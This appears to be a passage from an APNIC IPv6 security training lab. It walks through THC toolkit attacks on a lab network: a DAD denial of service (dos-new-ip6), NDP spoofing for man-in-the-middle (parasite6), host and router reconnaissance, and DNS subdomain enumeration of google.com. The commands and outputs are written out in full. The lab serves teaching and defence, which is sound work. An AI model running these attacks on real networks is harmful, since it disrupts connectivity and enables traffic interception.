
## Task 4: IPv6 NDP Related Attacks

### Attack 1: DAD DoS Attack

#### Section 4.1

On **Attacker-Host**, run the following command to start the DAD DoS attack.

**Attacker-Host**
```
apnic@attacker-host:~# sudo dos-new-ip6 ens3
Started ICMP6 DAD Denial-of-Service (Press Control-C to end) ...
Spoofed packet for existing ip6 as fe80::200:aff:febc:2
```

This tool will send spoofed NA responses to DAD NS messages from new devices (DAD is performed even for link-locals). Effectively, this does not allow a new IPv6 device on the network to get IPv6 addresses. Once a new DAD NS is sent by any host, Attacker-Host sends out spoofed NAs (for every link-local address the client wants to get).

On **Victim-Host**, run the following commands to toggle the interface and see the impact.

**Victim-Host**
```
apnic@victim-host:~# sudo ifconfig ens3 down
apnic@victim-host:~# sudo ifconfig ens3 up
```

On **Victim-Host**, run the following command to see the impact.

**Victim-Host**
```
apnic@victim-host:~# ip -6 addr show ens3
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    altname enp0s3
    inet6 fe80::200:aff:febc:2/64 scope link dadfailed tentative
       valid_lft forever preferred_lft forever
```

There is no GUA generated on the interface ens3. If there is an LLA, it's shown as "tentative" and it will not be used.

#### Section 4.2

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo dos-new-ip6 ens3
Started ICMP6 DAD Denial-of-Service (Press Control-C to end) ...
Spoofed packet for existing ip6 as fe80::200:aff:febc:2
^C
apnic@Attacker-Host:~$
```

On **Victim-Host**, toggle the ens3 interface.

**Victim-Host**
```
apnic@victim-host:~# sudo ifconfig ens3 down
apnic@victim-host:~# sudo ifconfig ens3 up
```

On **Victim-Host**, recheck IP address and routing table. Now it should show normal output again.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 2037  bytes 135072 (135.0 KB)
        RX errors 0  dropped 1807  overruns 0  frame 0
        TX packets 371  bytes 39490 (39.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591888sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1688sec mtu 1500 hoplimit 64 pref medium
```

On **Victim-Host**, try to ping Router's Loopback0 IP address. Now it should be pingable again.

**Victim-Host**
```
apnic@victim-host:~# ping6 2001:db8::1 -c 3
PING 2001:db8::1 (2001:db8::1) 56 data bytes
64 bytes from 2001:db8::1: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from 2001:db8::1: icmp_seq=2 ttl=64 time=1.49 ms
64 bytes from 2001:db8::1: icmp_seq=3 ttl=64 time=1.55 ms

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.427/1.487/1.545/0.048 ms
```

### Attack 2: NDP Spoofing Attack

#### Section 4.3

On **Victim-Host**, run the following command to find its LLA and MAC address.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 965  bytes 59106 (59.1 KB)
        RX errors 0  dropped 942  overruns 0  frame 0
        TX packets 35  bytes 3234 (3.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On **Attacker-Host**, run the following command to turn on IPv6 forwarding.

**Attacker-Host**
```
apnic@attacker-host:~# echo 1 | sudo tee /proc/sys/net/ipv6/conf/all/forwarding
1
```

On **Attacker-Host**, run the following command to start the NDP Spoofing attack.

**Attacker-Host**
```
apnic@attacker-host:~# sudo parasite6 -l ens3
Remember to enable routing, you will denial service otherwise:
 =>  echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
Remember to prevent sending out ICMPv6 Redirect packets:
 =>  ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP
Started ICMP6 Neighbor Solitication Interceptor (Press Control-C to end) ...
```

This tool will send spoofed NAs for NS messages, to redirect traffic towards itself (or towards some other machine under its control).

#### Section 4.4

On **Victim-Host**, ping the router's interface (simulates any other IPv6 node on the link).

**Victim-Host**
```
apnic@victim-host:~# ping6 2001:db8:0:100::1 -c 5
PING 2001:db8:0:100::1 (2001:db8:0:100::1) 56 data bytes
64 bytes from 2001:db8:0:100::1: icmp_seq=1 ttl=64 time=7.33 ms
64 bytes from 2001:db8:0:100::1: icmp_seq=2 ttl=64 time=1.91 ms
64 bytes from 2001:db8:0:100::1: icmp_seq=3 ttl=64 time=2.10 ms

--- 2001:db8:0:100::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.906/3.777/7.328/2.511 ms
```

On **Attacker-Host**, we will see the logs. If the attack is not working, it may be because the Victim-Host already has the correct NDP entries cached (in REACHABLE or STALE state). Try flushing the Victim-Host's neighbor cache by running `sudo ip -6 neigh flush all`, then ping again with `ping6 2001:db8:0:100::1 -c 5`.

**Attacker-Host**
```
apnic@attacker-host:~# sudo parasite6 -l ens3
Remember to enable routing, you will denial service otherwise:
 =>  echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
Remember to prevent sending out ICMPv6 Redirect packets:
 =>  ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP
Started ICMP6 Neighbor Solitication Interceptor (Press Control-C to end) ...
Spoofed packet to 2001:db8:0:100:200:aff:febc:2 as 2001:db8:0:100::1
Spoofed packet to fe80::5054:ff:fe98:a162 as 2001:db8:0:100::1
Spoofed packet to fe80::5054:ff:fe98:a162 as 2001:db8:0:100:200:aff:febc:2
Spoofed packet to fe80::200:aff:febc:1 as fe80::5054:ff:fe98:a162
Spoofed packet to fe80::200:aff:febc:2 as fe80::5054:ff:fe98:a162
Spoofed packet to fe80::5054:ff:fe98:a162 as fe80::200:aff:febc:1
Spoofed packet to fe80::5054:ff:fe98:a162 as fe80::200:aff:febc:2
```

On **Victim-Host**, run the following command to check Victim-Host's IPv6 neighbour table. As the Attacker-Host's MAC address is now shown against Router's GUA, the traffic from Victim-Host will go to Attacker-Host instead of going to Router.

**Victim-Host**
```
apnic@victim-host:~# ip -6 neighbor show
fe80::200:aff:febc:1 dev ens3 lladdr 00:00:0a:bc:00:01 router DELAY
fe80::5054:ff:fe98:a162 dev ens3 lladdr 00:00:0a:bc:00:03 router DELAY
2001:db8:0:100::1 dev ens3 lladdr 00:00:0a:bc:00:03 router REACHABLE
2001:db8:0:100:200:aff:febc:3 dev ens3 lladdr 00:00:0a:bc:00:03 router STALE
```

#### Section 4.5

On **Attacker-Host**, stop attack by pressing Ctrl + C.

**Attacker-Host**
```
apnic@attacker-host:~# sudo parasite6 -l ens3
Remember to enable routing, you will denial service otherwise:
 =>  echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
Remember to prevent sending out ICMPv6 Redirect packets:
 =>  ip6tables -I OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP
Started ICMP6 Neighbor Solitication Interceptor (Press Control-C to end) ...
Spoofed packet to 2001:db8:0:100:200:aff:febc:2 as 2001:db8:0:100::1
Spoofed packet to fe80::5054:ff:fe98:a162 as 2001:db8:0:100::1
Spoofed packet to fe80::5054:ff:fe98:a162 as 2001:db8:0:100:200:aff:febc:2
Spoofed packet to fe80::200:aff:febc:1 as fe80::5054:ff:fe98:a162
Spoofed packet to fe80::200:aff:febc:2 as fe80::5054:ff:fe98:a162
Spoofed packet to fe80::5054:ff:fe98:a162 as fe80::200:aff:febc:1
Spoofed packet to fe80::5054:ff:fe98:a162 as fe80::200:aff:febc:2
^C
apnic@Attacker-Host:~$
```

On **Victim-Host**, either toggle the ens3 interface:

**Victim-Host**
```
apnic@victim-host:~# sudo ifconfig ens3 down
apnic@victim-host:~# sudo ifconfig ens3 up
```

Or flush the neighbor table:

**Victim-Host**
```
apnic@victim-host:~# sudo ip -6 neigh flush all
```

On **Victim-Host**, recheck IP address. Now it should show normal output again.

**Victim-Host**
```
apnic@victim-host:~# ifconfig ens3
ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 2001:db8:0:100:200:aff:febc:2  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::200:aff:febc:2  prefixlen 64  scopeid 0x20<link>
        ether 00:00:0a:bc:00:02  txqueuelen 1000  (Ethernet)
        RX packets 2037  bytes 135072 (135.0 KB)
        RX errors 0  dropped 1807  overruns 0  frame 0
        TX packets 371  bytes 39490 (39.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On **Victim-Host**, check the routing table. Now it should show normal output again.

**Victim-Host**
```
apnic@victim-host:~# ip -6 route show
2001:db8:0:100::/64 dev ens3 proto ra metric 1024 expires 2591888sec mtu 1500 hoplimit 64 pref medium
fe80::/64 dev ens3 proto kernel metric 256 pref medium
default via fe80::200:aff:febc:1 dev ens3 proto ra metric 1024 expires 1688sec mtu 1500 hoplimit 64 pref medium
```

On **Victim-Host**, try to ping Router's Loopback0 IP address. Now it should be pingable again.

**Victim-Host**
```
apnic@victim-host:~# ping6 2001:db8::1 -c 3
PING 2001:db8::1 (2001:db8::1) 56 data bytes
64 bytes from 2001:db8::1: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from 2001:db8::1: icmp_seq=2 ttl=64 time=1.49 ms
64 bytes from 2001:db8::1: icmp_seq=3 ttl=64 time=1.55 ms

--- 2001:db8::1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.427/1.487/1.545/0.048 ms
```

On **Victim-Host**, run the following command to check the IPv6 neighbour table again. We will see the correct MAC for the router.

**Victim-Host**
```
apnic@victim-host:~# ip -6 neighbor show
fe80::200:aff:febc:1 dev ens3 lladdr 00:00:0a:bc:00:01 router STALE
2001:db8:0:100::1 dev ens3 lladdr 00:00:0a:bc:00:01 router REACHABLE
```

### Summary

**What is happening?**
- Attacker uses `parasite6` to send fake Neighbor Advertisement (NA) packets.
- Victim receives these fake updates and replaces the router's MAC with the attacker's MAC in its NDP table.
- Victim's traffic destined for the router is sent to the attacker instead.

**Impact on the Victim Host**
- **MITM:** Attacker can intercept all IPv6 traffic.
- **Privacy breach:** Attacker sees victim's packets (clear text traffic).
- **DoS:** If attacker does NOT forward packets, victim loses IPv6 connectivity.
- **Redirection:** Attacker can reroute victim traffic to malicious servers.
- **Integrity attack:** Traffic can be modified before forwarding.

**Why resetting the NIC fixes it?**
- Bringing the interface down/up clears the NDP cache.
- Victim re-learns the correct router MAC via Router Advertisements.
- Attack no longer active means the NDP table stays clean.

---

## Task 5: IPv6 Network Reconnaissance

### Section 5.1

On **Attacker-Host**, run the following command to scan the live IPv6 addresses in this network. From the result, we can see both the Router and the Victim-Host have been found during the scan.

**Attacker-Host**
```
apnic@attacker-host:~# sudo alive6 ens3
Alive: 2001:db8:0:100:200:aff:febc:2 [ICMP echo-reply]
Alive: 2001:db8:0:100::1 [ICMP parameter problem]

Scanned 1 address and found 2 systems alive
```

### Section 5.2

On **Attacker-Host**, run the following command to dump all local routers and their information.

**Attacker-Host**
```
apnic@attacker-host:~# sudo dump_router6 ens3
Router: fe80::200:aff:febc:1 (MAC: 00:00:0a:bc:00:01)
  Priority: medium
  Hop Count: 64
  Lifetime: 1800, Reachable: 0, Retrans: 0
  Flags: NOTmanaged NOTother NOThome-agent NOTproxied
  Options:
    MAC: 00:00:0a:bc:00:01
    MTU: 1500
    Prefix: 2001:db8:0:100::/64 (Valid: 2592000, Preferred: 604800)
      Flags: On-Link Autoconfig NOT-Router-Address
```

### Summary

This simulates an attacker discovering all online devices in an IPv6 subnet. Because IPv6 subnets are /64 (very large), you cannot brute-force scan them. But IPv6 devices respond to certain multicast messages, making them easy to find.

**Risks:**
- Attackers can quickly discover all IPv6 devices, even with huge address space.
- This helps attackers choose a target for:
  - MITM attacks
  - DHCPv6 spoofing
  - Router advertisement poisoning
  - Local network reconnaissance

### Section 5.3

On **Attacker-Host**, run the following command to find all subdomains and enumerate IPv6 addresses of google.com.

**Attacker-Host**
```
apnic@attacker-host:~# sudo dnsdict6 -d google.com
Starting DNS enumeration work on google.com. ...
Gathering NS and MX information...
NS of google.com. is ns4.google.com. => 2001:4860:4802:38::a
NS of google.com. is ns1.google.com. => 2001:4860:4802:32::a
NS of google.com. is ns2.google.com. => 2001:4860:4802:34::a
NS of google.com. is ns3.google.com. => 2001:4860:4802:36::a
MX of google.com. is smtp.google.com. => 2404:6800:4003:c04::1a
MX of google.com. is smtp.google.com. => 2404:6800:4003:c04::1b
MX of google.com. is smtp.google.com. => 2404:6800:4003:c05::1b
MX of google.com. is smtp.google.com. => 2404:6800:4003:c05::1a

Starting enumerating google.com. - creating 8 threads for 1420 words...
Estimated time to completion: 1 to 2 minutes
1.google.com. => 2404:6800:4006:801::200e
admin.google.com. => 2404:6800:4006:80a::200e
aa.google.com. => 2404:6800:4006:802::200e
ap.google.com. => 2404:6800:4006:810::2004
apps.google.com. => 2404:6800:4006:809::200e
blog.google.com. => 2404:6800:4006:80f::2009
billing.google.com. => 2404:6800:4006:810::200e
catalog.google.com. => 2404:6800:4006:814::200e
calendar.google.com. => 2404:6800:4006:80a::200e
chat.google.com. => 2404:6800:4006:80a::200e
cloud.google.com. => 2404:6800:4006:801::200e
code.google.com. => 2404:6800:4006:80f::200e
d.google.com. => 2404:6800:4006:814::200e
dl.google.com. => 2404:6800:4006:80a::200e
dns.google.com. => 2001:4860:4860::8844
dns.google.com. => 2001:4860:4860::8888
directory.google.com. => 2404:6800:4006:801::200e
docs.google.com. => 2404:6800:4006:813::200e
doc.google.com. => 2404:6800:4006:80a::200e
download.google.com. => 2404:6800:4006:810::2004
earth.google.com. => 2404:6800:4006:814::200e
downloads.google.com. => 2404:6800:4006:809::2004
edu.google.com. => 2404:6800:4006:809::200e
enterprise.google.com. => 2404:6800:4006:801::200e
email.google.com. => 2404:6800:4006:801::200e
events.google.com. => 2404:6800:4006:814::200e
fi.google.com. => 2404:6800:4006:80a::200e
files.google.com. => 2404:6800:4006:80f::200e
gemini.google.com. => 2404:6800:4006:810::200e
help.google.com. => 2404:6800:4006:813::200e
home.google.com. => 2404:6800:4006:801::200e
id.google.com. => 2404:6800:4006:809::2003
images.google.com. => 2404:6800:4006:80a::200e
ipv6.google.com. => 2404:6800:4006:814::200e
jobs.google.com. => 2404:6800:4006:814::200e
ldap.google.com. => 2001:4860:4802:32::3a
labs.google.com. => 2404:6800:4006:809::200e
m.google.com. => 2404:6800:4006:812::200b
local.google.com. => 2404:6800:4006:812::200e
mail.google.com. => 2404:6800:4006:809::2005
map.google.com. => 2404:6800:4006:813::200e
mars.google.com. => 2404:6800:4006:810::200e
maps.google.com. => 2404:6800:4006:813::200e
music.google.com. => 2404:6800:4006:810::200e
moon.google.com. => 2404:6800:4006:813::200e
mobile.google.com. => 2404:6800:4006:810::200b
news.google.com. => 2404:6800:4006:80f::200e
ns1.google.com. => 2001:4860:4802:32::a
ns2.google.com. => 2001:4860:4802:34::a
ns4.google.com. => 2001:4860:4802:38::a
ns3.google.com. => 2001:4860:4802:36::a
orion.google.com. => 2404:6800:4006:80f::200e
photos.google.com. => 2404:6800:4006:802::200e
photo.google.com. => 2404:6800:4006:809::200e
pki.google.com. => 2404:6800:4006:814::200e
research.google.com. => 2404:6800:4006:813::200e
security.google.com. => 2404:6800:4006:814::200e
sandbox.google.com. => 2404:6800:4003:c02::451
shop.google.com. => 2404:6800:4003:c03::5c
search.google.com. => 2404:6800:4006:809::200e
services.google.com. => 2404:6800:4006:813::200e
sms.google.com. => 2404:6800:4006:814::200e
smtp.google.com. => 2404:6800:4003:c04::1a
smtp.google.com. => 2404:6800:4003:c04::1b
smtp.google.com. => 2404:6800:4003:c05::1b
smtp.google.com. => 2404:6800:4003:c05::1a
store.google.com. => 2404:6800:4006:809::200e
support.google.com. => 2404:6800:4006:814::200e
time.google.com. => 2001:4860:4806:4::
time.google.com. => 2001:4860:4806::
time.google.com. => 2001:4860:4806:8::
time.google.com. => 2001:4860:4806:c::
tools.google.com. => 2404:6800:4006:801::200e
tv.google.com. => 2404:6800:4006:80f::200e
upload.google.com. => 2404:6800:4006:810::200f
video.google.com. => 2404:6800:4006:801::200e
w.google.com. => 2404:6800:4006:814::200e
wap.google.com. => 2404:6800:4006:802::200e
web.google.com. => 2404:6800:4006:802::200e
www.google.com. => 2404:6800:4006:812::2004
www4.google.com. => 2404:6800:4006:813::200e

Found 74 domain names and 35 unique ipv6 addresss for google.com.
```

---

## Conclusion

In this lab, participants examined the security challenges unique to IPv6 and gained practical experience in both executing and mitigating common IPv6-based attacks. By working with the THC IPv6 Attack Toolkit, participants observed how vulnerabilities in Router Advertisements, Neighbor Discovery (NDP), and IPv6 reconnaissance can be exploited in real networks.

- **RA-based attacks** highlighted how easily rogue routers can disrupt IPv6 connectivity and redirect traffic.
- **RA Guard** demonstrated an effective mitigation technique for blocking unauthorized Router Advertisements at the access layer.
- **NDP attacks** showed how spoofed Neighbor Solicitation and Advertisement messages can manipulate host neighbour caches.
- **IPv6 reconnaissance** techniques revealed how attackers can discover active hosts and services even within large IPv6 subnets.

Together, these exercises provide a deeper understanding of how IPv6 security threats operate and how they can be controlled. Completing this lab should give participants greater confidence in identifying, testing, and defending against IPv6-specific vulnerabilities, strengthening the security of modern IPv6 deployments.